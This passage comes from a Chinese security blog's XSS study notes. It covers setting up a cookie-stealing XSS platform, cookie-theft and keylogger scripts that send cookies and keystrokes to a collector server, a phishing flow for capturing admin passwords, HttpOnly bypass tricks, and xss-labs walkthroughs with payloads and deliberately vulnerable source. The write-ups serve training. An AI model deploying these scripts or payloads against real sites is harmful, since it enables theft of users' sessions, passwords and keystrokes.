<li>其余选项可保持默认，然后提交</li>
<li>▲ 一定记得要修改</li>
<li>▲ 若提示data/template/myjs三个存储路径需要写权限，可在/xss目录下进行修改</li>
</ul>
</li>
<li>安装成功</li>
</ul>
</li>
<li>登陆访问尝试以及平台测试（获取Cookie）<ul>
<li>访问http://服务器IP地址/login.php</li>
<li>配置公共模板default.js，修改js代码中的网站地址为http://服务器IP地址/index.php</li>
<li>最后，点击下方的修改，保存修改</li>
<li>进入”我的js”模块</li>
<li>设置js文件名称</li>
<li>选择default.js模板</li>
<li>插入模板</li>
<li>新增保存js测试代码</li>
<li>生成payload</li>
<li>站点尝试是否能打到cookie（即使http-only也会返回一定数据）</li>
</ul>
</li>
</ul>
<h4 id="3-多人用XSS平台"><a href="#3-多人用XSS平台" class="headerlink" title="3. 多人用XSS平台"></a>3. 多人用XSS平台</h4><ul>
<li>▲ 修改已有XSS平台的代码，然后搭建在自己的服务器上</li>
<li>Window Server 2003 -&gt;  iis搭建xss平台套装（ZkeysPHP、xs.zip、ISAPI_Rewrite3）<ul>
<li>Window Server 2003绑定静态IP<ul>
<li>需要一个固定IP，若要提供外网使用，需要一个外网IP</li>
</ul>
</li>
<li>安装iis -&gt; 开始 -&gt; 管理工具 -&gt; IIS -&gt; 网站 -&gt; 默认网站</li>
<li>默认网站 -&gt; 网站根目录 -&gt; 清除源码 -&gt; 拷贝xs.zip中的源码到文件夹</li>
<li>安装ZkeysPHP（php+mysql环境）</li>
<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
<li>用户名：root / 密码：zkeys</li>
<li>创建数据库xss</li>
<li>导入 -&gt; 浏览 -&gt; 网站根目录 -&gt; xssplatform.sql -&gt; 执行</li>
<li>SQL -&gt; UPDATE oc_moudle SET code=REPLACE(code,’<a href="http://xsser.me&#39;,&#39;http://Window" target="_blank" rel="noopener">http://xsser.me&#39;,&#39;http://Window</a> Server 2003的IP’)</li>
</ul>
</li>
<li>网站根目录 -&gt; config.php -&gt; 查看配置是否修改（urlroot等）</li>
<li>物理机访问Window Server 2003的IP/index.php查看是否访问得到<ul>
<li>可添加index.php为网站默认页，通过默认网站 -&gt; 属性 -&gt; 文档 -&gt; 添加 -&gt; index.php -&gt; 应用</li>
<li>进行用户名，密码邮箱的注册，并登陆</li>
</ul>
</li>
<li>创建XSS项目</li>
<li>▲ 若无法盗取cookie，进行ISAPI_Rewrite3软件的安装<ul>
<li>默认安装 -&gt; 开始 -&gt; Helicon -&gt; ISAPI_Rewrite3 -&gt; 默认站点 -&gt; 编辑 -&gt; 应用</li>
</ul>
</li>
<li>▲ 邀请码模式<ul>
<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
<li>用户名：root / 密码：zkeys</li>
<li>点击oc_user表，修改刚新添加的用户的adminLevel级别为1</li>
<li>执行</li>
</ul>
</li>
<li>修改权限（网站根目录）<ul>
<li>权限设置：shift所有的目录 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
<li>权限设置：shift所有的文件 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
<li>对网站根目录设置权限：右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作（▲ PHP需求）</li>
</ul>
</li>
<li>浏览器访问<a href="http://Window" target="_blank" rel="noopener">http://Window</a> Server 2003的IP/index.php?do=user&amp;act=invite</li>
<li>进行生成邀请码</li>
<li>邀请码注册尝试</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--Cookie与键盘记录器</title>
    <url>/2020/04/02/XSS--Cookie%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/</url>
    <content><![CDATA[<hr>
<h4 id="1-Cookie的获取"><a href="#1-Cookie的获取" class="headerlink" title="1. Cookie的获取"></a>1. Cookie的获取</h4><ul>
<li>反射型XSS的cookie获取</li>
<li>存储型XSS的cookie获取</li>
<li>http-only启用时获取登陆密码（钓鱼方式）<ul>
<li>钓鱼准备<ul>
<li>伪造一个完全相同的登陆界面a.html（可通过右键保存页面为html）</li>
<li>编写一个a.php，用于接收a.html的传值并跳转到b.php</li>
<li>编写一个b.php，用于传值后跳转到正常的登陆界面</li>
</ul>
</li>
<li>攻击者往有xss漏洞的地方传入访问a.html的代码</li>
<li>管理员登陆后台，触发攻击者插入的html代码，弹窗显示a.html界面<ul>
<li>若想要逼真，可通过js代码展示”登陆超时，请重新登陆的”</li>
</ul>
</li>
<li>管理员输入账号密码进行登陆，然后通过b.php跳转到正常登陆页面</li>
<li>攻击者接收到管理员输入的账号密码</li>
<li>▲ Linux平台和Windows平台克隆下来的界面源代码可能出现编码问题</li>
<li>▲ 每次点击一次管理界面，都会触发一次xss代码</li>
</ul>
</li>
<li>httponly下的攻击手法（来自Se7en）<ul>
<li>phpinfo页<ul>
<li>伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中<code>$_SERVER[&quot;HTTP_COOKIE&quot;]</code>会打印出具有httponly属性的cookies</li>
<li>优点：成功率很高，最不容易被察觉，也是最常用的一种方式</li>
<li>缺点：需要phpinfo页，条件苛刻</li>
</ul>
</li>
<li>框架钓鱼<ul>
<li>通过<iframe>标签嵌入一个远程域，完全撑开后，以覆盖原有的页面</li>
<li>优点：无跳转，域名无改变</li>
<li>缺点：通常会覆盖某个正常的页面，管理员易察觉</li>
</ul>
</li>
<li>跳转钓鱼<ul>
<li>通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站</li>
<li>优点：主动性较强，可主动钓鱼</li>
<li>缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现</li>
</ul>
</li>
<li>历史密码<ul>
<li>通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码</li>
<li>优点：不易被发现，可直接获取明文，成功率较高</li>
<li>缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能</li>
</ul>
</li>
<li>获取源码<ul>
<li>通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等</li>
<li>优点：信息获取的比较详细，也可以获取到后台账号名称</li>
<li>缺点：局限性较大，不易于利用</li>
</ul>
</li>
</ul>
</li>
<li>编写接收cookie代码：简单形式a.js+cookie.php</li>
</ul>
<pre><code>//a.js
&lt;script&gt;

    var cookie = document.cookie;
    var url = &quot;http://127.0.0.1/cookie.php?x=&quot;;
    windows.location.href=url_cookie;

&lt;script&gt;

//cookie.php
&lt;?php

    $cookie = $_GET[&#39;x&#39;];
    $file = fopen(&quot;cookie.txt&quot;,&quot;w+&quot;);
    fwrite($file,$cookie);
    fclose($file);

?&gt;</code></pre><ul>
<li>编写接收cookie代码：极简模式b.js-2+cookies.php<ul>
<li>b.js放于80端口，cookies.php是不存在的</li>
<li>▲ 需要监听b.js中设定的端口</li>
</ul>
</li>
</ul>
<pre><code>var img = new Image();
img.src=&quot;http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie;</code></pre><h4 id="2-键盘记录器"><a href="#2-键盘记录器" class="headerlink" title="2. 键盘记录器"></a>2. 键盘记录器</h4><ul>
<li>三个文件位于同个目录</li>
<li>Keylogger.js</li>
</ul>
<pre><code>document.onkeypress = function(evt) { 
    evt = evt || window.event 
    key = String.fromCharCode(evt.charCode) 
    if (key) {       
        var http = new XMLHttpRequest(); 
        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
        http.send(&quot;key=&quot;+param); 
    } 
}</code></pre><ul>
<li>Keylogger.php</li>
</ul>
<pre><code>&lt;?php 
    $key=$_POST[&#39;key&#39;]; 
    $logfile=&quot;keylog.txt&quot;; 
    $fp = fopen($logfile, &quot;a&quot;); 
    fwrite($fp, $key); 
    fclose($fp);  
?&gt;</code></pre><ul>
<li>keylog.txt，不需要有数据，但需要有可读可写的权限</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场--封神台</title>
    <url>/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h4><ul>
<li>先是尝试输入特征字符<code>&#39;&quot;&lt;&gt;666</code>,按F12查看转义或者过滤情况</li>
<li>发现<code>&#39;</code>没有转义，其他都有被转义</li>
<li>进行利用，构造payload：<code>9&#39; onclick=&#39;alert(/xss/)</code></li>
<li>搜索并点击输入框，弹出flag</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/reflect-flag.png" srcset="/img/loading.gif" alt="reflect-flag"></p>
<h4 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h4><ul>
<li>进入CMS，对着各种框框就是一顿操作</li>
<li>插入各种代码’”&lt;&gt;666，<script>alert(1)</script>等</li>
<li>▲ 然并软，没啥用</li>
<li>返回查看题目，CMS通杀？赶紧百度一下</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/name-store.png" srcset="/img/loading.gif" alt="name-store"></p>
<ul>
<li>信息收集一波后，发现是FineCMS v5.3.0有两个XSS漏洞，查找到资料如下</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/link-store.png" srcset="/img/loading.gif" alt="link-store"></p>
<ul>
<li>依猫画葫芦的，插入字段<code>c=text&amp;m=&lt;script&gt;alert(1)&lt;/script&gt;</code><ul>
<li>发现可以弹窗，这可以进行利用了</li>
<li>▲ 除了c和m，其他字段的提交好像都无法构成闭合</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/c&id-store.png" srcset="/img/loading.gif" alt="c&amp;id-store"></p>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/c&m-store.png" srcset="/img/loading.gif" alt="c&amp;m-store"></p>
<ul>
<li>构造payload，在xss平台构造payload，进行代码注入，静态boot的Cookie<ul>
<li>▲ 此处无任何过滤…</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/cookie-store.png" srcset="/img/loading.gif" alt="cookie-store"></p>
<ul>
<li>在查找资料的过程中，找到两份资料，讲述了第二个存储型漏洞</li>
<li>(xeel的文章)[<a href="https://bbs.zkaq.cn/t/3016.html]" target="_blank" rel="noopener">https://bbs.zkaq.cn/t/3016.html]</a></li>
<li>(FreeBuf上大佬的分析)[<a href="https://www.freebuf.com/column/165269.html]" target="_blank" rel="noopener">https://www.freebuf.com/column/165269.html]</a></li>
<li>对第二个存储型漏洞进行检测</li>
<li>对留言板进行代码注入，查看源代码发现被转义</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/source-store.png" srcset="/img/loading.gif" alt="source-store"></p>
<ul>
<li>在放弃之余，尝试了xeel老哥的抓包操作，发现可以</li>
<li>注入xss平台的代码就不写了，能弹窗就能进行插入xss平台的代码</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/burp-store.png" srcset="/img/loading.gif" alt="burp-store"></p>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/insert-store.png" srcset="/img/loading.gif" alt="insert-store"></p>
<ul>
<li>疑问<ul>
<li>为什么抓包修改可以，难道这里对特殊字符的转义是在客户端?</li>
</ul>
</li>
</ul>
<h4 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h4><ul>
<li>进入DOM XSS的页面，这里有点小插曲，如下，安全狗<ul>
<li>▲ 这里有点神奇的是，我用chrome去访问，会有安全狗，但用Firefox去访问，是没有问题的，刚开始怀疑是User-agent的原因，后面去换了User-agent，没有问题，这里因为安全狗卡了好久，后面才知道原来掌握安全的课堂上有讲</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/safe-dog.png" srcset="/img/loading.gif" alt="safe-dog"></p>
<ul>
<li>对DOM XSS的画面</li>
<li>各自输入框进行插入尝试，<code>&#39;&quot;&lt;&gt;666,&lt;script&gt;alert(1)&lt;/script&gt;等</code></li>
<li>审查元素和源代码都没有问题</li>
<li>返回去查看题目</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-name.png" srcset="/img/loading.gif" alt="dom-name"></p>
<ul>
<li>审查dom.txt</li>
<li>发现有对输入的内容的过滤（过滤真的多！！）</li>
<li>发现url，机缘巧合之下发现自己好像没有审计url</li>
<li>正则匹配写入文件，这个可以后期利用（通过iframe）</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-txt.png" srcset="/img/loading.gif" alt="dom-txt"></p>
<ul>
<li>审查url</li>
<li>往url插入<code>&#39;&quot;&lt;&gt;666,&lt;script&gt;alert(1)&lt;/script&gt;</code>等，但无法成功</li>
<li>百般无奈往社区一查 -&gt; 原来需要Unicode编码以及”?”号，到目前还是不是很清楚，这两个是如何看出来的，难道就是因为多次试错，Unicode编码我可以理解，但”?”这个就难以描述<ul>
<li>后面解答：问号在URL栏里面是什么？你记不记得POST和GET传参的区别。GET传参会显示在URL栏里面，那么浏览器怎么区分这个是GET传参还是网址？就是通过问号，问号后的一切都是GET传参</li>
</ul>
</li>
<li>插入代码，进行弹窗</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-script2.png" srcset="/img/loading.gif" alt="dom-script2"></p>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-script1.png" srcset="/img/loading.gif" alt="dom-script1"></p>
<ul>
<li>构造payload，通过xss平台构造，然后通过Unicode编码，成功截取到管理员的Cookie</li>
</ul>
<p><img src="/images/xss/%E5%B0%81%E7%A5%9E%E5%8F%B0/dom-cookie.png" srcset="/img/loading.gif" alt="dom-cookie"></p>
<ul>
<li>▲ 2020.03.28 颜色输入框后面”#000000”也存在XSS漏洞，暂未实验</li>
</ul>
<h4 id="4-靶场说明"><a href="#4-靶场说明" class="headerlink" title="4. 靶场说明"></a>4. 靶场说明</h4><ul>
<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场--xss-labs</title>
    <url>/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--xss-labs/</url>
    <content><![CDATA[<hr>
<h4 id="1-level-1"><a href="#1-level-1" class="headerlink" title="1. level-1"></a>1. level-1</h4><ul>
<li>没有输入框，但url地址栏可以进行输入</li>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现页面也出现了相应的内容</li>
<li>F12查看源代码，没有过滤和转义</li>
<li>直接插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>没有任何过滤</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level2.php?keyword=test&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level1&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;name&quot;];
echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="2-level-2"><a href="#2-level-2" class="headerlink" title="2. level-2"></a>2. level-2</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现是在input标签，value属性中的，也没有进行过滤和转义</li>
<li>插入Onclick事件：<code>q&quot; onclick=&quot;alert(1)</code></li>
<li>⭐ 点击q，成功弹窗</li>
<li>源码分析<ul>
<li>htmlspecialchars()函数，但是只是对输出校验，未对输入校验</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level3.php?writing=wait&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level2&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form action=level2.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;
&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="3-level-3"><a href="#3-level-3" class="headerlink" title="3. level-3"></a>3. level-3</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现是在input标签，value属性中的，除了单引号，其他的都进行了转义</li>
</ul>
<p><img src="/images/xss/xss-lab/level-3--%E8%BD%AC%E4%B9%89.png" srcset="/img/loading.gif" alt="level-3--转义"></p>
<ul>
<li>level-2的payload能用，双引号改单引号就可以</li>
<li>插入Onclick事件：<code>q&#39; onclick=&#39;alert(1)</code></li>
<li>⭐ 点击q，成功弹窗</li>
<li>源码分析<ul>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level3&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="4-level-4"><a href="#4-level-4" class="headerlink" title="4. level-4"></a>4. level-4</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现是在input标签，value属性中的，对<code>&lt;&gt;</code>进行了过滤</li>
</ul>
<p><img src="/images/xss/xss-lab/level-4-%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="level-4-过滤"></p>
<ul>
<li>那继续插入level-2的payload，插入Onclick事件：<code>q&quot; onclick=&quot;alert(1)</code></li>
<li>⭐ 点击q，成功弹窗</li>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，匹配掉<code>&lt;&gt;</code>符号</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level4&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="5-level-5"><a href="#5-level-5" class="headerlink" title="5. level-5"></a>5. level-5</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现无过滤和转义</li>
<li>那继续插入level-2的payload，插入Onclick事件：<code>q&quot; onclick=&quot;alert(1)</code></li>
<li>发现对onclick这个单词进行了修改</li>
</ul>
<p><img src="/images/xss/xss-lab/level-5--%E4%BF%AE%E6%94%B9.png" srcset="/img/loading.gif" alt="level-5--修改"></p>
<ul>
<li>通过伪协议触发：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>⭐ 点击 <code>&#39;&gt;</code>，成功弹窗</li>
<li>源码分析<ul>
<li>strtolower()函数，将字符串转为小写</li>
<li>字符串匹配函数str_replace()，将<code>&lt;script</code>转换为<code>&lt;scr_ipt</code>，将<code>on</code>转换为<code>o_n</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level6.php?keyword=break it out!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level5&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="6-level-6"><a href="#6-level-6" class="headerlink" title="6. level-6"></a>6. level-6</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现无过滤和转义</li>
<li>那继续插入level-2的payload，插入Onclick事件：<code>q&quot; onclick=&quot;alert(1)</code></li>
<li>发现对onclick这个单词进行了修改</li>
</ul>
<p><img src="/images/xss/xss-lab/level-6--%E4%BF%AE%E6%94%B91.png" srcset="/img/loading.gif" alt="level-6--修改1"></p>
<ul>
<li>使用level-5的payload，通过伪协议触发：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>发现对href这个单词进行了修改</li>
</ul>
<p><img src="/images/xss/xss-lab/level-6--%E4%BF%AE%E6%94%B92.png" srcset="/img/loading.gif" alt="level-6--修改2"></p>
<ul>
<li>大小写：<code>&quot;&gt;&lt;a hRef=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>⭐ 点击 <code>&#39;&gt;</code>，成功弹窗</li>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，将<code>&lt;script</code>转换为<code>&lt;scr_ipt</code>，将<code>on</code>转换为<code>o_n</code>，将<code>src</code>转换为<code>sr_c</code>，将<code>data</code>转换为<code>da_ta</code>，将<code>href</code>转换为<code>hr_ef</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level7.php?keyword=move up!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level6&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="7-level-7"><a href="#7-level-7" class="headerlink" title="7. level-7"></a>7. level-7</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现无过滤和转义</li>
<li>那继续插入level-2的payload，插入Onclick事件：<code>q&quot; onclick=&quot;alert(1)</code></li>
<li>发现onclick的on被过滤</li>
</ul>
<p><img src="/images/xss/xss-lab/level-7-%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="level-7-过滤"></p>
<ul>
<li>重复字符：<code>q&quot; oonnclick=&quot;alert(1)</code></li>
<li>⭐ 点击q，成功弹窗</li>
<li>源码分析<ul>
<li>strtolower()函数，将字符串转为小写</li>
<li>字符串匹配函数str_replace()，将script、on、src、data、href转换为空</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
